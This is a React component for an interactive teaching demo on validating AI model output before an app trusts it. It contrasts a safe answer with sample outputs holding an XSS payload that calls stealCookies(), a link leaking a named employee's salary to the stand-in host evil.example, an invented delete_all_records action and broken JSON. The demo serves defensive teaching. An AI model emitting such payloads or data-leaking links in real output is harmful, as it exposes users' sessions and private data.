"use client";

import * as React from "react";
import { DemoFrame } from "../DemoFrame";
import { Switch } from "@/components/ui/Switch";

const OUTPUTS = [
  { label: "Good answer", raw: '{"text": "You have 28 holiday days.", "action": "none", "links": ["https://docs.castle.example/holidays"]}', ok: true, rawEffect: "Shows the answer and a link to our docs.", why: "" },
  { label: "Script in text", raw: '{"text": "Hi <img src=x onerror=stealCookies()>", "action": "none", "links": []}', ok: false, rawEffect: "The browser runs stealCookies(): the visitor's session is stolen (XSS).", why: "text is HTML-escaped, so it shows as harmless text" },
  { label: "Data in a link", raw: '{"text": "See this", "action": "none", "links": ["https://evil.example/c?d=salary-of-sara-52000"]}', ok: false, rawEffect: "Clicking (or an auto-loaded image) sends private data to evil.example.", why: "links: unknown domain evil.example" },
  { label: "Made-up action", raw: '{"text": "Done!", "action": "delete_all_records", "links": []}', ok: false, rawEffect: "The app calls delete_all_records. Everything is gone.", why: "action must be none, open_ticket or show_article" },
  { label: "Broken JSON", raw: '{"text": "You have 28 days', ok: false, rawEffect: "The app crashes with a parse error; the user sees a blank page.", why: "invalid JSON, so a safe fallback answer is shown" },
];

export default function OutputValidationDemo() {
  const [idx, setIdx] = React.useState(1);
  const [validate, setValidate] = React.useState(false);
  const o = OUTPUTS[idx];
  const harmful = !o.ok && !validate;

  return (
    <DemoFrame
      title="Reading every letter before it leaves"
      hint="The model returned this. What happens if the app trusts it as-is?"
      onReset={() => {
        setIdx(1);
        setValidate(false);
      }}
    >
      <div className="flex flex-wrap gap-1">
        {OUTPUTS.map((x, i) => (
          <button
            key={x.label}
            type="button"
            onClick={() => setIdx(i)}
            className="rounded-full border px-2.5 py-0.5 text-[11px]"
            style={{ borderColor: i === idx ? "var(--accent)" : "var(--border)" }}
          >
            {x.label}
          </button>
        ))}
      </div>
      <pre className="mt-2 whitespace-pre-wrap break-all rounded-lg bg-surface p-2 font-mono text-[10px]">{o.raw}</pre>
      <div className="mt-2">
        <Switch checked={validate} onChange={setValidate} label="Validate output (schema, allowlists, escaping)" className="text-xs" />
      </div>
      <p className="mt-3 rounded-lg px-3 py-2 text-xs" aria-live="polite" style={{ backgroundColor: `color-mix(in srgb, ${harmful ? "var(--bad)" : "var(--good)"} 15%, transparent)` }}>
        {o.ok ? o.rawEffect : validate ? `Rejected or fixed: ${o.why}.` : o.rawEffect}
      </p>
    </DemoFrame>
  );
}
